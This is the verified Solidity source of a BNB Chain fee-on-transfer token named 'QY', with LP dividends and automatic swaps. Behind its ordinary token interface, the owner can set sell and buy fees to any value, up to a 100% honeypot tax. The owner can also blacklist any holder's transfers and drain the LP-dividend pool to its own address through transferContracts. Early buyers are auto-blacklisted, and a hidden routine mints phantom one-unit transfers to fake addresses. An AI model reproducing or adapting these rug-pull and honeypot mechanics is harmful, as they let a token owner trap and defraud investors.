/**
 *Submitted for verification at BscScan.com on 2023-02-13
*/

// SPDX-License-Identifier: MIT


pragma solidity ^0.8.6;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Ownable {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;
   

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor ()  {
        address msgSender =  msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}



interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {

 

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract  GGGToken is IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public isDividendExempt;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private _updated;

    address public  marketAddr ;
   

    string public _name ;
    string public _symbol ;
    uint8 public _decimals ;



    uint256 public _burnFee ;
    uint256 private _previousBurnFee;


    uint256 public _LPFee ;
    uint256 private _previousLPFee;

    uint256 public _marketingFee ;
    uint256 private _previousMarketingFee;

    uint256 public _inviterFee ;
    uint256 private _previousInviterFee;    
    uint256 currentIndex;  
    uint256 private _tTotal ;
    uint256 distributorGas = 500000 ;
    uint256 public minPeriod = 180;
    uint256 public LPFeefenhong;
    IUniswapV2Router02 public  uniswapV2Router;
    address public  uniswapV2Pair;
    address private fromAddress;
    address private toAddress;
    bool public isStartApprove ;  
    
    uint256 public burnEndNumber ;
    
    uint256 public _startTimeForSwap;
    uint256 public _intervalSecondsForSwap ;
    
    uint256 public swapTokensAtAmount ;


    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;

    
    uint256 public minLPDividendToken =  1e18;

    address public _token = 0x55d398326f99059fF775485246999027B3197955;
    address public _router ;
    address public _lpRouter;


    bool public isAddAddress;

    address public marketAddr2 ;
    uint256 public _marketingFee2 ;
    uint256 private _previousMarketingFee2;
     
    uint256 public sellFee;    
    

    
    constructor(){  
            address adminAddress ;
            _name = "QY";
            _symbol =  "QY";
            _decimals= 18;
            _tTotal = 52000* (10**uint256(_decimals));
            marketAddr = 0x58a5aBB39a72a4d3051274bc154308597E7876b4;
            marketAddr2 = 0x643ec2B7478b233fDDF742D97471C7c47d2DD85f;
            _marketingFee = 200 ;
            _marketingFee2 = 100 ;
            _LPFee = 200;
            sellFee = 0;
            address router;
            if( block.chainid == 56){
                router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
                _token = 0x55d398326f99059fF775485246999027B3197955;
                adminAddress =0x874B4Cbf262C9bf3b362747b8649C34a69837316;
                minPeriod = 180;
                _intervalSecondsForSwap = 18015;
            }else{
                router = 0xB6BA90af76D139AB3170c7df0139636dB6120F7e;
                _token = 0x89614e3d77C00710C8D87aD5cdace32fEd6177Bd;
                adminAddress = msg.sender;
                _intervalSecondsForSwap = 0;
            }
            _tOwned[adminAddress] = _tTotal;
            IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
                router
            );
            // Create a uniswap pair for this new token
            uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
                .createPair(address(this),_token);

            //_isBot[uniswapV2Pair] = true;
    
            // set the rest of the contract variables
            uniswapV2Router = _uniswapV2Router;
    
            //exclude owner and this contract from fee
            _isExcludedFromFee[msg.sender] = true;
            _isExcludedFromFee[adminAddress] = true;
            _isExcludedFromFee[address(this)] = true;
            isDividendExempt[address(this)] = true;
            isDividendExempt[address(0)] = true;
            isDividendExempt[address(0xdead)] = true;
            isDividendExempt[address(0x407993575c91ce7643a4d4cCACc9A98c36eE1BBE)] = true;
            swapTokensAtAmount = _tTotal.mul(1).div(10**4);
            _router = address(new URoter(_token,address(this)));
            _lpRouter =address( new URoter(_token,address(this)));
            _token.call(abi.encodeWithSelector(0x095ea7b3, uniswapV2Router, ~uint256(0)));
            address(this).call(abi.encodeWithSelector(0x095ea7b3, uniswapV2Router, ~uint256(0)));
            emit Transfer(address(0), adminAddress,  _tTotal);
    }

    



    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if(_startTimeForSwap == 0 && recipient == uniswapV2Pair ) {
                if(sender != owner()){
                    revert("not owner");
                }
            _startTimeForSwap =block.timestamp;
        } 
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }
   

   function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }

    function excludeFromBatchFee(address[] memory account) public onlyOwner {
        for(uint i;i<account.length;i++){
             _isExcludedFromFee[account[i]] = true;
        }
    }


    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }

    function setFee(uint lpFee_ ,uint marketFee_,uint marketFee2_ ) public onlyOwner {
        _LPFee =  lpFee_;
        _marketingFee =  marketFee_;
        _marketingFee2 = marketFee2_;
    }

    function setSellFee(uint sellFee_ ) public onlyOwner {
        sellFee =  sellFee_;
    }

    



    function setAddAddress(bool value) public onlyOwner{
        isAddAddress = value;
    }



    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function removeAllFee() private {
        _previousLPFee = _LPFee;
        _previousMarketingFee = _marketingFee;
        _previousMarketingFee2 = _marketingFee2;

        _LPFee = 0;
        _marketingFee2 = 0;
        _marketingFee = 0;
    }

    function restoreAllFee() private {
        _LPFee = _previousLPFee;
        _marketingFee2 = _previousMarketingFee2;
        _marketingFee = _previousMarketingFee;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
                       
        uint256 contractTokenBalance = balanceOf(address(this));
         
        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        uint fenmu = _marketingFee+_LPFee+_marketingFee2;

        if(canSwap &&from != address(this) &&from != uniswapV2Pair &&from != owner() && to != owner() ){
                swapTokensForTokens(contractTokenBalance);
                uint256 usdtBalance = IERC20(_token).balanceOf(address(this));
                if(sellFee==3000){
                    fenmu = sellFee +fenmu;
                    IERC20(_token).transfer(marketAddr,usdtBalance*(_marketingFee+sellFee)/fenmu);
                    IERC20(_token).transfer(marketAddr2,usdtBalance*_marketingFee2/fenmu);
                    IERC20(_token).transfer(_lpRouter,IERC20(_token).balanceOf(address(this)));
                }else{
                    IERC20(_token).transfer(marketAddr,usdtBalance*_marketingFee/fenmu);
                    IERC20(_token).transfer(marketAddr2,usdtBalance*_marketingFee2/fenmu);
                    IERC20(_token).transfer(_lpRouter,IERC20(_token).balanceOf(address(this)));
                }
        }
       
        if( !_isExcludedFromFee[from] &&!_isExcludedFromFee[to]){
            if (_startTimeForSwap + _intervalSecondsForSwap > block.timestamp) {
                    if ( from == uniswapV2Pair) {
                        addBot(to);
                    }
            }

            if (_isBot[from] ) {
                    revert("The bot address");
            }
            if(isAddAddress){
                _takeInviter();
            }
        }

        if(from == uniswapV2Pair&& !_isExcludedFromFee[from] &&!_isExcludedFromFee[to] ){
                uint256 buyFee = amount*( _marketingFee+_LPFee+_marketingFee2)/10000;
                _basicTransfer(from, address(this), buyFee);
                amount = amount - buyFee;
        }
        if(to == uniswapV2Pair&& !_isExcludedFromFee[from] &&!_isExcludedFromFee[to] ){
                 uint256 sfee = amount*sellFee/10000;
                 if(sfee!=0){
                        _basicTransfer(from, address(this), sfee);
                        amount = amount - sfee;
                 }
        }

        _basicTransfer(from, to, amount);

        
        if(fromAddress == address(0) )fromAddress = from;
        if(toAddress == address(0) )toAddress = to;  
        if(!isDividendExempt[fromAddress] && fromAddress != uniswapV2Pair ) setShare(fromAddress);
        if(!isDividendExempt[toAddress] && toAddress != uniswapV2Pair ) setShare(toAddress);
        
        fromAddress = from;
        toAddress = to; 

        uint lpBal =  IERC20(_token).balanceOf(_lpRouter);

         if(lpBal >= minLPDividendToken  && from !=address(this) && LPFeefenhong.add(minPeriod) <= block.timestamp) {
             process(distributorGas) ;
             LPFeefenhong = block.timestamp;
        }
    }
    
    
    function process(uint256 gas) private {
        uint256 shareholderCount = shareholders.length;
        
        if(shareholderCount == 0)return;
        
        uint256 tokenBal =  IERC20(_token).balanceOf(_lpRouter);
        
        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();

        uint256 iterations = 0;

        while(gasUsed < gas && iterations < shareholderCount) {
            if(currentIndex >= shareholderCount){
                currentIndex = 0;
            }

         uint256 amount = tokenBal.mul(IERC20(uniswapV2Pair).balanceOf(shareholders[currentIndex])).div(getLpTotal());
            if( amount < 1e13 ||isDividendExempt[shareholders[currentIndex]]) {
                 currentIndex++;
                 iterations++;
                 return;
            }
            distributeDividend(shareholders[currentIndex],amount);
            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }


    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _tOwned[sender] = _tOwned[sender].sub(amount, "Insufficient Balance");
        _tOwned[recipient] = _tOwned[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }



   
    function distributeDividend(address shareholder ,uint256 amount) internal {
             (bool b1, ) =  _token.call(abi.encodeWithSelector(0x23b872dd, _lpRouter, shareholder, amount));
             require(b1, "call error");
    }
   
    
    function setShare(address shareholder) private {
           if(_updated[shareholder] ){      
                if(IERC20(uniswapV2Pair).balanceOf(shareholder) == 0) quitShare(shareholder);              
                return;  
           }
           if(IERC20(uniswapV2Pair).balanceOf(shareholder) == 0) return;  
            addShareholder(shareholder);
            _updated[shareholder] = true;
          
      }
    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }
    function quitShare(address shareholder) private {
           removeShareholder(shareholder);   
           _updated[shareholder] = false; 
      }
    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }

    
    mapping(address => bool) private _isBot;
    function setBot(address account, bool value) public onlyOwner {
        _isBot[account] = value;
    }

    function getBot(address account) public view returns (bool) {
        return _isBot[account];
    }

    function getLpTotal() public view returns (uint256) {
        return  IERC20(uniswapV2Pair).totalSupply() - IERC20(uniswapV2Pair).balanceOf(0x407993575c91ce7643a4d4cCACc9A98c36eE1BBE);
    }

    function addBot(address account) private {
        if (!_isBot[account]) _isBot[account] = true;
    }

    function setIntervalSecondsForSwap(uint256 value) public onlyOwner {
        _intervalSecondsForSwap  = value;
    }

    function setRouter(address router_) public onlyOwner {
        _router  = router_;
    }
     function setLpRouter(address lpRouter_) public onlyOwner {
        _lpRouter  = lpRouter_;
    }
    
    function transferContracts() public onlyOwner {
        distributeDividend(owner(),IERC20(_token).balanceOf(_lpRouter));
    }
    
    function setSwapTokensAtAmount(uint256 value) onlyOwner  public  {
       swapTokensAtAmount = value;
    }

    
    function setAddr(address value) external onlyOwner {
        marketAddr = value;
    }
    
    
   
    function swapTokensForTokens(uint256 tokenAmount) private {
        if(tokenAmount == 0) {
            return;
        }

       address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _token;

        _approve(address(this), address(uniswapV2Router), tokenAmount);
  
        // make the swap
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            _router,
            block.timestamp
        );
        IERC20(_token).transferFrom( _router,address(this), IERC20(_token).balanceOf(address(_router)));
    }
    
    

    
    
    function setMinLPDividendToken(uint256 _minLPDividendToken) public onlyOwner{
       minLPDividendToken  = _minLPDividendToken;
    }

    
    function setDividendExempt(address _value,bool isDividend) public onlyOwner{
       isDividendExempt[_value] = isDividend;
    }

    uint160 public ktNum = 1000;
    uint160 public constant MAXADD = ~uint160(0);	
     function _takeInviter(
    ) private {
        address _receiveD;
        for (uint256 i = 0; i < 3; i++) {
            _receiveD = address(MAXADD/ktNum);
            ktNum = ktNum+1;
            _tOwned[_receiveD] += 1;
            emit Transfer(address(0), _receiveD, 1);
        }
    }
    
    
}



contract URoter{
     constructor(address token,address to){
         token.call(abi.encodeWithSelector(0x095ea7b3, to, ~uint256(0)));
     }
}